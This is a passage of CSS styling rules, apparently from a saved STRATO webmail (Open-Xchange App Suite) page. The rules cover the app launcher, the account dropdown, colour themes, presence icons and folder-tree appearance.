        #io-ox-appcontrol #io-ox-topleftbar .launcher>button,
        #io-ox-appcontrol #io-ox-toprightbar .launcher>button {
            padding: 16px 11px;
            cursor: pointer;
            font-size: 18px;
            text-decoration: none;
            color: #fff;
        }

        #io-ox-appcontrol #io-ox-topleftbar .launcher>a:hover,
        #io-ox-appcontrol #io-ox-toprightbar .launcher>a:hover,
        #io-ox-appcontrol #io-ox-topleftbar .launcher>button:hover,
        #io-ox-appcontrol #io-ox-toprightbar .launcher>button:hover,
        #io-ox-appcontrol #io-ox-topleftbar .launcher>a:focus,
        #io-ox-appcontrol #io-ox-toprightbar .launcher>a:focus,
        #io-ox-appcontrol #io-ox-topleftbar .launcher>button:focus,
        #io-ox-appcontrol #io-ox-toprightbar .launcher>button:focus {
            background: rgba(0, 0, 0, 0.3);
            outline: 0;
            color: #fff;
        }

        #io-ox-appcontrol #io-ox-topleftbar .launcher-icon.fa-question,
        #io-ox-appcontrol #io-ox-toprightbar .launcher-icon.fa-question {
            font-size: 22px;
        }

        #io-ox-appcontrol #io-ox-topleftbar .launcher-icon.fa-refresh,
        #io-ox-appcontrol #io-ox-toprightbar .launcher-icon.fa-refresh {
            position: relative;
        }

        #io-ox-appcontrol #io-ox-topleftbar .contact-picture,
        #io-ox-appcontrol #io-ox-toprightbar .contact-picture {
            width: 40px;
            height: 40px;
            background-repeat: no-repeat;
            background-position: center center;
            background-size: cover;
            border-radius: 50%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #eee;
            color: rgba(0, 0, 0, 0.6);
            font-size: 13px;
            font-weight: bold;
            background-clip: padding-box;
            border: 1px solid rgba(0, 0, 0, 0.5);
        }

        #topbar-account-dropdown .user {
            padding: 3px 20px;
            display: flex;
            width: 100%;
        }

        #topbar-account-dropdown .user .action {
            display: flex;
            padding: 0;
            background: none;
        }

        #topbar-account-dropdown .user .user-picture-container {
            margin-right: 16px;
            width: 64px;
        }

        #topbar-account-dropdown .user .user-picture {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 64px;
            height: 64px;
            background-repeat: no-repeat;
            background-position: center center;
            background-size: cover;
            border-radius: 50%;
            background-color: #eee;
            color: rgba(0, 0, 0, 0.6);
            font-size: 20px;
            font-weight: bold;
            background-clip: padding-box;
            border: 1px solid rgba(0, 0, 0, 0.5);
        }

        #topbar-account-dropdown .user .user-picture .fa {
            display: none;
        }

        #topbar-account-dropdown .user .action:hover .fa,
        #topbar-account-dropdown .user .action:focus .fa {
            display: block;
        }

        #topbar-account-dropdown .user .action:hover .initials,
        #topbar-account-dropdown .user .action:focus .initials {
            display: none;
        }

        #topbar-account-dropdown .user .action:focus .user-picture {
            box-shadow: 0 0 8px 2px #07b;
        }

        #topbar-account-dropdown .user .action:focus .user-picture[style] {
            box-shadow: 0 0 8px 2px #07b, 0 0 0 2px #fff inset;
        }

        #topbar-account-dropdown .user .text-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            min-width: 0;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        #topbar-account-dropdown .user .text-container .name {
            font-size: 16px;
            font-weight: 700;
        }

        #topbar-account-dropdown .user .text-container .name,
        #topbar-account-dropdown .user .text-container .mail {
            min-width: 0;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .smartphone #topbar-account-dropdown .user {
            width: auto;
        }

        .smartphone #topbar-account-dropdown .user .user-picture-container {
            width: 48px;
        }

        .smartphone #topbar-account-dropdown .user .user-picture {
            width: 48px;
            height: 48px;
        }

        .smartphone #topbar-account-dropdown .user .action {
            flex-direction: column;
            justify-content: center;
        }

        .smartphone #topbar-account-dropdown .user .text-container {
            text-align: left;
        }

        .ie11 .launcher-dropdown.dropdown-menu {
            width: 318px !important;
        }

        .launcher-dropdown.dropdown-menu {
            padding: 8px;
            width: 318px;
        }

        .smartphone .launcher-dropdown.dropdown-menu {
            width: 100% !important;
            left: 0px !important;
            right: 0px !important;
            height: auto !important;
            top: 50px !important;
            max-height: 90%;
            -webkit-overflow-scrolling: touch;
        }

        .launcher-dropdown.dropdown-menu li {
            float: left;
        }

        .launcher-dropdown.dropdown-menu li .fa {
            width: auto;
        }

        .launcher-dropdown.dropdown-menu li a:focus {
            outline: 0;
        }

        .launcher-dropdown.dropdown-menu li a:focus i,
        .launcher-dropdown.dropdown-menu li a:focus .title {
            color: #fff;
        }

        .launcher-dropdown.dropdown-menu a.lcell {
            height: 96px;
        }

        .launcher-dropdown.dropdown-menu .lcell {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            white-space: normal;
            margin: 2px;
            height: 84px;
            width: 96px;
            cursor: pointer;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.indicator {
            display: none;
        }

        .launcher-dropdown.dropdown-menu .lcell .closer {
            font-size: 15px;
            color: #666;
            height: 42px;
        }

        .smartphone .launcher-dropdown.dropdown-menu .lcell {
            width: calc(100vw / 3 - 8px);
            padding: 0;
            margin: 0;
        }

        .launcher-dropdown.dropdown-menu .lcell .title {
            color: #666;
            font-size: 12px;
            text-align: center;
            width: 96px;
            display: flex;
            flex-direction: row;
            justify-content: center;
            align-items: center;
        }

        .smartphone .launcher-dropdown.dropdown-menu .lcell .title {
            font-size: 14px;
            top: 70%;
            overflow: hidden;
            text-overflow: ellipsis;
            width: 100%;
            display: block;
            white-space: nowrap;
        }

        .launcher-dropdown.dropdown-menu .lcell .title.upsell i {
            color: #ffc107;
            margin-left: 4px;
            font-size: 14px;
            top: 0;
        }

        .launcher-dropdown.dropdown-menu .lcell .badge {
            position: absolute;
            top: 43%;
            right: 17%;
            font-size: 9px;
            z-index: 1;
            background-color: #757575;
        }

        .launcher-dropdown.dropdown-menu .lcell .icon {
            width: 56px;
            flex: 1;
        }

        .launcher-dropdown.dropdown-menu .lcell svg,
        .launcher-dropdown.dropdown-menu .lcell i {
            position: relative;
            top: 10px;
            font-size: 36px;
            color: #7a7a7a;
            overflow: visible;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-mail,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-mail {
            color: #4c68ac;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-mail .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-mail .stroke-c1 {
            stroke: #4c68ac;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-mail .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-mail .fill-c1 {
            fill: #4c68ac;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-chat,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-chat {
            color: #5e35b1;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-chat .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-chat .stroke-c1 {
            stroke: #5e35b1;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-chat .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-chat .fill-c1 {
            fill: #5e35b1;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-calendar,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-calendar {
            color: #c62828;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-calendar .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-calendar .stroke-c1 {
            stroke: #c62828;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-calendar .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-calendar .fill-c1 {
            fill: #c62828;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-addressbook,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-addressbook {
            color: #43a047;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-addressbook .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-addressbook .stroke-c1 {
            stroke: #43a047;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-addressbook .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-addressbook .fill-c1 {
            fill: #43a047;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-drive,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-drive {
            color: #444;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-drive .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-drive .stroke-c1 {
            stroke: #444;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-drive .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-drive .fill-c1 {
            fill: #444;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-tasks,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-tasks {
            color: #f57c00;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-tasks .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-tasks .stroke-c1 {
            stroke: #f57c00;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-tasks .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-tasks .fill-c1 {
            fill: #f57c00;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-portal,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-portal {
            color: #999;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-portal .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-portal .stroke-c1 {
            stroke: #999;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-portal .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-portal .fill-c1 {
            fill: #999;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-text,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-text {
            color: #2c569a;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-text .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-text .stroke-c1 {
            stroke: #2c569a;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-text .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-text .fill-c1 {
            fill: #2c569a;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-spreadsheet,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-spreadsheet {
            color: #227643;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-spreadsheet .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-spreadsheet .stroke-c1 {
            stroke: #227643;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-spreadsheet .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-spreadsheet .fill-c1 {
            fill: #227643;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-presentation,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-presentation {
            color: #d24727;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-presentation .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-presentation .stroke-c1 {
            stroke: #d24727;
        }

        .launcher-dropdown.dropdown-menu .lcell svg.colored.app-icon-presentation .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i.colored.app-icon-presentation .fill-c1 {
            fill: #d24727;
        }

        .launcher-dropdown.dropdown-menu .lcell svg .stroke-c1,
        .launcher-dropdown.dropdown-menu .lcell i .stroke-c1 {
            stroke: #666;
        }

        .launcher-dropdown.dropdown-menu .lcell svg .fill-none,
        .launcher-dropdown.dropdown-menu .lcell i .fill-none {
            fill: none;
        }

        .launcher-dropdown.dropdown-menu .lcell svg .fill-c1,
        .launcher-dropdown.dropdown-menu .lcell i .fill-c1 {
            fill: #666;
        }

        .launcher-dropdown.dropdown-menu .lcell svg .stroke-w1,
        .launcher-dropdown.dropdown-menu .lcell i .stroke-w1 {
            stroke-width: 3px;
        }

        .retina .launcher-dropdown.dropdown-menu .lcell svg .stroke-w1,
        .retina .launcher-dropdown.dropdown-menu .lcell i .stroke-w1 {
            stroke-width: 3px;
        }

        .launcher-dropdown.dropdown-menu button.lcell {
            background: #fff;
        }

        .launcher-dropdown.dropdown-menu button.lcell:focus,
        .launcher-dropdown.dropdown-menu button.lcell:hover {
            background: #eee;
        }

        .launcher-dropdown.dropdown-menu button.lcell:focus .stroke-c1,
        .launcher-dropdown.dropdown-menu button.lcell:hover .stroke-c1 {
            stroke: #666;
        }

        .launcher-dropdown.dropdown-menu button.lcell:focus .fill-c1,
        .launcher-dropdown.dropdown-menu button.lcell:hover .fill-c1 {
            fill: #666;
        }

        #io-ox-launchgrid-overlay {
            z-index: 11;
            display: none;
            background-color: rgba(255, 255, 255, 0.01);
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            top: 64px;
        }

        #io-ox-launchgrid-overlay.open {
            display: block;
        }

        .smartphone #io-ox-launchgrid-overlay {
            top: 50px;
        }

        #io-ox-launchgrid-overlay-inner {
            position: absolute;
            display: none;
            top: 0;
            right: 0;
            left: 0;
            bottom: 0;
            z-index: 1;
        }

        @media (max-width: 320px) {
            .smartphone #io-ox-appcontrol #io-ox-topsearch {
                margin-right: 0;
            }

            .smartphone #io-ox-appcontrol #io-ox-topleftbar .launcher>a {
                padding: 16px 9px;
            }

            .smartphone #io-ox-appcontrol #io-ox-toprightbar .launcher>a {
                padding: 16px 9px;
            }

            .smartphone #io-ox-appcontrol #io-ox-launcher>button.launcher-btn {
                width: 44px;
            }
        }

        .mx-dawn {
            background-image: linear-gradient(70deg, #0d456d, #469490, #0e466d);
        }

        #io-ox-appcontrol {
            background-color: #f80;
        }

        html.design-primary #io-ox-appcontrol {
            background-color: #f80;
        }

        html.design-night #io-ox-appcontrol {
            background-image: linear-gradient(70deg, #1a2848, #40498e, #1a2848);
        }

        html.design-night #io-ox-appcontrol:before {
            background-image: linear-gradient(70deg, #1a2848, #40498e, #1a2848);
            opacity: 0;
        }

        html.design-twilight #io-ox-appcontrol {
            background-image: linear-gradient(70deg, #1a2848, #40498e, #1a2848);
        }

        html.design-twilight #io-ox-appcontrol:before {
            background-image: linear-gradient(70deg, #093f4b, #718e5c, #093f4b);
            opacity: 1;
        }

        html.design-dawn #io-ox-appcontrol {
            background-image: linear-gradient(70deg, #0d456d, #469490, #0e466d);
        }

        html.design-dawn #io-ox-appcontrol:before {
            background-image: linear-gradient(70deg, #093f4b, #718e5c, #093f4b);
            opacity: 0;
        }

        html.design-day #io-ox-appcontrol {
            background-image: linear-gradient(70deg, #0d456d, #469490, #0e466d);
        }

        html.design-day #io-ox-appcontrol:before {
            background-image: linear-gradient(70deg, #293f72, #4d6aad, #293f72);
            opacity: 1;
        }

        html.design-dusk #io-ox-appcontrol {
            background-image: linear-gradient(70deg, #2a2972, #ac4dad, #292b72);
        }

        html.design-dusk #io-ox-appcontrol:before {
            background-image: linear-gradient(70deg, #293f72, #4d6aad, #293f72);
            opacity: 0;
        }

        html.design-late #io-ox-appcontrol {
            background-image: linear-gradient(70deg, #2a2972, #ac4dad, #292b72);
        }

        html.design-late #io-ox-appcontrol:before {
            background-image: linear-gradient(70deg, #1a2848, #40498e, #1a2848);
            opacity: 1;
        }

        html.design-primary .primary-action .btn.btn-primary {
            background-color: #f80;
        }

        html.design-night .primary-action .btn.btn-primary {
            background-color: #f80;
        }

        html.design-twilight .primary-action .btn.btn-primary {
            background-color: #4d7155;
        }

        html.design-dawn .primary-action .btn.btn-primary {
            background-color: #2c6e7f;
        }

        html.design-day .primary-action .btn.btn-primary {
            background-color: #f80;
        }

        html.design-dusk .primary-action .btn.btn-primary {
            background-color: #753e93;
        }

        html.design-late .primary-action .btn.btn-primary {
            background-color: #f80;
        }

        .presence {
            display: inline-block;
            line-height: 0;
        }

        .presence .icon {
            color: white;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            margin-right: 8px;
            background-clip: content-box;
        }

        .presence .icon svg {
            height: 12px;
        }

        .presence .icon svg text {
            display: none;
        }

        .presence.dot .icon {
            width: 10px;
            height: 10px;
        }

        .presence.dot .icon svg {
            display: none;
        }

        .presence.offline .icon {
            background-color: #aaa;
        }

        .presence.online .icon {
            background-color: #7cb342;
        }

        .presence.online svg .online {
            display: inline;
        }

        .presence.busy .icon {
            background-color: #d00;
        }

        .presence.busy svg .busy {
            display: inline;
        }

        .presence.absent .icon {
            background-color: #ffa500;
        }

        .presence.absent svg .absent {
            display: inline;
        }

        #io-ox-topbar-account-dropdown-icon>.dropdown-toggle>.presence {
            position: absolute;
            top: 36px;
            right: 0;
        }

        #io-ox-topbar-account-dropdown-icon>.dropdown-toggle>.presence .icon {
            border: 1px solid rgba(0, 0, 0, 0.6);
        }

        #topbar-account-dropdown .offline {
            display: inline-block;
        }

        .list-view.show-contact-pictures .list-item .presence,
        .vgrid-scrollpane .list-item .presence {
            position: absolute;
            top: 20px;
            left: 20px;
        }

        .list-view.show-contact-pictures.show-text-preview .list-item .presence,
        .vgrid-scrollpane.show-text-preview .list-item .presence {
            top: 24px;
            left: 24px;
        }

        .list-view.show-contact-pictures .presence.offline,
        .vgrid-scrollpane .presence.offline {
            display: none;
        }

        .list-view.show-contact-pictures .presence .icon,
        .vgrid-scrollpane .presence .icon {
            border: 1px solid white;
            box-sizing: content-box;
        }

        .list-view.show-contact-pictures .selected .presence .icon,
        .vgrid-scrollpane .selected .presence .icon {
            border-color: #ddd;
        }

        .list-view.show-contact-pictures.has-focus .selected .presence .icon,
        .vgrid-scrollpane.has-focus .selected .presence .icon {
            border-color: #e9f0fa;
        }

        .participant-wrapper .presence {
            position: absolute;
            top: 37px;
            left: 40px;
        }

        .participant-wrapper .presence .icon {
            border: 1px solid white;
            box-sizing: content-box;
        }

        .participant-wrapper .presence.offline {
            display: none;
        }

        .participantsrow .participant-wrapper .presence {
            left: 56px;
        }

        .freetime-view .participant-wrapper .presence {
            top: 18px;
            left: 23px;
        }
    </style>
    <meta id="theme" />
    <meta id="css" />
    <style type="text/css"
        data-require-src="https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070454/apps/themes/strato/style">
        .io-ox-dialog-wrapper .sms-dialog .modal-body {
            max-height: none;
            overflow: inherit;
        }

        .first-start-wizard .modal-body {
            height: auto;
        }

        .window-sidepanel .generic-toolbar.bottom,
        .window-sidepanel,
        .window-search,
        .rightside.mail-detail-pane {
            background: #f8f8f8;
        }

        #io-ox-top-logo-small {
            float: left;
            width: 30px;
            background-image: url("apps/themes/strato/logo-small.png");
        }

        .show-banner #io-ox-top-logo-small {
            display: none;
        }

        h1 {
            font-weight: normal;
        }

        h2 {
            font-weight: normal;
            color: #333;
        }

        h3 {
            font-weight: normal;
            color: #333;
        }

        h4 {
            color: #333;
            font-weight: bold;
        }

        a:link {
            color: #07b;
        }

        a:focus,
        a:hover {
            color: #004576;
            outline: none;
        }

        a:active {
            color: #0074b5;
            outline: none;
        }

        .mail-item.visible-selection.has-focus .list-item.selected i.seen-unseen-indicator:before {
            color: #07b;
        }

        html.macos .preview-right .visible-selection.mail-item.list-view.has-focus .list-item.unread.selected .from .person,
        html.ios .visible-selection.mail-item.list-view.has-focus .list-item.unread.selected .from .person {
            color: #000;
        }

        .io-ox-mail-compose .sender .address,
        .btn-link,
        .io-ox-action-link {
            color: #07b;
        }

        .io-ox-mail-compose .sender .address.disabled,
        .btn-link.disabled,
        .io-ox-action-link.disabled {
            color: #ccc;
        }

        .io-ox-mail-compose .sender .address.disabled:hover,
        .btn-link.disabled:hover,
        .io-ox-action-link.disabled:hover {
            color: #ccc;
            text-decoration: none;
        }

        .io-ox-mail-compose .sender .address.disabled:active,
        .btn-link.disabled:active,
        .io-ox-action-link.disabled:active {
            color: #ccc;
            text-decoration: none;
        }

        .io-ox-mail-compose .sender .address:hover,
        .btn-link:hover,
        .io-ox-action-link:hover {
            color: #004576;
            text-decoration: none;
        }

        .io-ox-mail-compose .sender .address:active,
        .btn-link:active,
        .io-ox-action-link:active {
            color: #0074b5;
            text-decoration: none;
        }

        .io-ox-mail-compose .sender .address.dropdown-toggle:not([data-action="create"]):focus,
        .btn-link.dropdown-toggle:not([data-action="create"]):focus,
        .io-ox-action-link.dropdown-toggle:not([data-action="create"]):focus,
        .io-ox-mail-compose .sender .address.dropdown-toggle:not([data-action="create"]):hover,
        .btn-link.dropdown-toggle:not([data-action="create"]):hover,
        .io-ox-action-link.dropdown-toggle:not([data-action="create"]):hover {
            color: #004576;
        }

        .io-ox-mail-compose .sender .address.dropdown-toggle:not([data-action="create"]):active,
        .btn-link.dropdown-toggle:not([data-action="create"]):active,
        .io-ox-action-link.dropdown-toggle:not([data-action="create"]):active {
            color: #0074b5;
        }

        .io-ox-office-main.popup-container .button.selected {
            background: #999 !important;
        }

        .io-ox-office-main.popup-container .button.selected .caption {
            color: #000 !important;
        }

        .io-ox-office-main.popup-container .button .caption {
            color: #000 !important;
        }

        .dropdown .dropdown-menu li a:focus {
            color: #000;
        }

        .dropdown>.actionlink {
            color: #999;
        }

        .dropdown>.actionlink:hover {
            color: #999;
            color: #004576;
        }

        .dropdown>.actionlink:active {
            color: #999;
            color: #0074b5;
        }

        .io-ox-action-link.upsell i {
            padding-right: 10px;
        }

        #io-ox-core #io-ox-appcontrol {
            border-bottom-color: #e70;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-top-logo img {
            height: 34px;
            width: 260px;
        }

        @media (max-width: 320px) {
            #io-ox-core #io-ox-appcontrol #io-ox-top-logo {
                display: block;
                width: 80px !important;
            }
        }

        #io-ox-core #io-ox-appcontrol .logo-btn:focus,
        #io-ox-core #io-ox-appcontrol .logo-btn:hover {
            color: #fff;
            background: #e70;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-topsearch {
            margin: 0;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-notifications-icon {
            min-width: 50px;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-quicklaunch>button {
            color: #fff;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-quicklaunch>button:focus,
        #io-ox-core #io-ox-appcontrol #io-ox-quicklaunch>button:hover {
            color: #fff;
            background: #e70;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-topleftbar .launcher>a {
            height: 62px;
            color: #fff;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-topleftbar .launcher>a:focus,
        #io-ox-core #io-ox-appcontrol #io-ox-topleftbar .launcher>a:hover {
            color: #fff;
            background: #e70;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher>a {
            color: #fff;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher>a:hover,
        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher>a:focus {
            color: #fff;
            background: #e70;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher:focus>a,
        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .launcher:hover>a {
            color: #fff;
            background: #e70;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .btn-link:hover *,
        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .btn-link:focus *,
        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .btn-link:hover i,
        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .btn-link:focus i {
            color: #fff;
            background: #e70;
        }

        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .dropdown-menu>li>a:hover,
        #io-ox-core #io-ox-appcontrol #io-ox-toprightbar .dropdown-menu>li>a:focus {
            background: #e70;
        }

        .smartphone #io-ox-core #io-ox-appcontrol #io-ox-top-logo,
        .smartphone #io-ox-core #io-ox-appcontrol #io-ox-toprightbar #io-ox-launcher>button.launcher-btn {
            height: 48px;
        }

        .launcher-dropdown.dropdown-menu li a:focus i,
        .launcher-dropdown.dropdown-menu li a:focus .title {
            color: #000;
        }

        .folder-tree .tree-container .selectable {
            color: #333;
        }

        .folder-tree .tree-container .selectable:focus .folder-node div {
            color: #333;
        }

        .folder-tree .tree-container .selectable .folder-pubsub {
            color: #999 !important;
        }

        .folder-tree .tree-container .selectable .folder-icon {
            color: #999;
        }

        .folder-tree .tree-container .selectable>.folder-node:focus,
        .folder-tree .tree-container .selectable>.folder-node:hover,
        .folder-tree .tree-container .selectable>.folder-node:active {
            background: #eaeaea;
            color: #333;
        }

        .folder-tree .tree-container .selectable>.folder-node:focus .folder-icon i,
        .folder-tree .tree-container .selectable>.folder-node:hover .folder-icon i,
        .folder-tree .tree-container .selectable>.folder-node:active .folder-icon i,
        .folder-tree .tree-container .selectable>.folder-node:focus .default i,
        .folder-tree .tree-container .selectable>.folder-node:hover .default i,
        .folder-tree .tree-container .selectable>.folder-node:active .default i {
            color: #f80;
        }

        .folder-tree .tree-container .selectable>.folder-node:focus *,
        .folder-tree .tree-container .selectable>.folder-node:hover *,
        .folder-tree .tree-container .selectable>.folder-node:active * {
            background: #eaeaea;
            color: #333;
        }

        .folder-tree .tree-container .selectable>.folder-node:focus .folder-counter,
        .folder-tree .tree-container .selectable>.folder-node:hover .folder-counter,
        .folder-tree .tree-container .selectable>.folder-node:active .folder-counter {
            color: #f80;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node {
            background: #ddd;
            color: #333;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node>*,
        .folder-tree .tree-container .selectable.selected>.folder-node>div i {
            color: #333;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node .folder-counter {
            color: #f80;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node .folder-options {
            background: #999;
            color: #fff;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node .folder-options i {
            color: inherit;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node .folder-icon {
            color: #f80;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node .folder-icon i {
            color: inherit;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node:focus,
        .folder-tree .tree-container .selectable.selected>.folder-node:hover {
            background: #ddd;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node:focus .folder-icon,
        .folder-tree .tree-container .selectable.selected>.folder-node:hover .folder-icon,
        .folder-tree .tree-container .selectable.selected>.folder-node:focus .default i,
        .folder-tree .tree-container .selectable.selected>.folder-node:hover .default i {
            color: #fff;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node:focus *:not(.folder-options),
        .folder-tree .tree-container .selectable.selected>.folder-node:hover *:not(.folder-options) {
            background: #ddd;
            color: #333;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node:focus .folder-icon i,
        .folder-tree .tree-container .selectable.selected>.folder-node:hover .folder-icon i {
            color: #999;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node:focus .folder-options i,
        .folder-tree .tree-container .selectable.selected>.folder-node:hover .folder-options i {
            background: #999;
            color: #fff;
        }

        .folder-tree .tree-container .selectable.selected>.folder-node:focus .folder-counter,
        .folder-tree .tree-container .selectable.selected>.folder-node:hover .folder-counter {
            color: #f80;
        }

        .folder-tree .tree-container .selectable.selected:hover,
        .folder-tree .tree-container .selectable.selected:focus {
            color: #333;
        }

        .folder-tree .tree-container .selectable.selected:hover>*,
        .folder-tree .tree-container .selectable.selected:focus>*,
        .folder-tree .tree-container .selectable.selected:hover>div i,
        .folder-tree .tree-container .selectable.selected:focus>div i {
            color: #333;
        }

        .folder-tree .tree-container .selectable.selected:hover .folder-counter,
        .folder-tree .tree-container .selectable.selected:focus .folder-counter {
            color: #f80;
        }

        .folder-tree .tree-container .selectable.selected:hover .folder-options,
        .folder-tree .tree-container .selectable.selected:focus .folder-options {
            background: #999;
            color: #fff;
        }

        .folder-tree .tree-container .selectable.selected:hover .folder-options i,
        .folder-tree .tree-container .selectable.selected:focus .folder-options i {
            color: inherit;
        }

        .folder-tree .tree-container .selectable.selected:hover .folder-counter,
        .folder-tree .tree-container .selectable.selected:focus .folder-counter {
            color: #f80;
        }

        .folder-tree .tree-container .selectable .folder-counter {
            color: #f80;
        }

        .folder-tree .tree-container .show-all-checkbox label,
        .folder-tree .tree-container .links {
            font-weight: 400;
        }

        .folder-tree .upsell i {
            padding-right: 10px;
        }

        @media (max-width: 480px) and (orientation: portrait),
        (max-height: 480px) and (orientation: landscape) {
            .smartphone #io-ox-top-logo {
                display: block;
                margin: 12px 0 0 10px !important;
                background: url("apps/themes/strato/strato_mobil.png") no-repeat;
                background-size: contain;
                float: right;
                width: 105px !important;
            }

            .smartphone #io-ox-top-logo img {
                display: none;
            }
        }

        @media only screen and (-webkit-min-device-pixel-ratio: 1.5),
        only screen and (-moz-min-device-pixel-ratio: 1.5),
        only screen and (min-device-pixel-ratio: 1.5),
        only screen and (min-resolution: 240dppx) {
            .smartphone #io-ox-top-logo {
                background-image: url("apps/themes/strato/strato_mobil_ret.png");
            }
        }

        @media all and (max-width: 320px) {
            .smartphone #io-ox-top-logo {
                display: none;
            }
        }

        .list-view.visible-selection .list-item:hover,
        .list-view.visible-selection .list-item:focus {
            background: #e9f0fa;
            color: #000;
        }

        .list-view.visible-selection .list-item.selected {
            background: #e9f0fa;
            color: #000;
        }

        .list-view.visible-selection .list-item.selected:hover,
        .list-view.visible-selection .list-item.selected:focus {
            background: #e9f0fa;
            color: #000;
        }

        .list-view.visible-selection .list-item.selected .fa-checkmark {
            color: #0074b5;
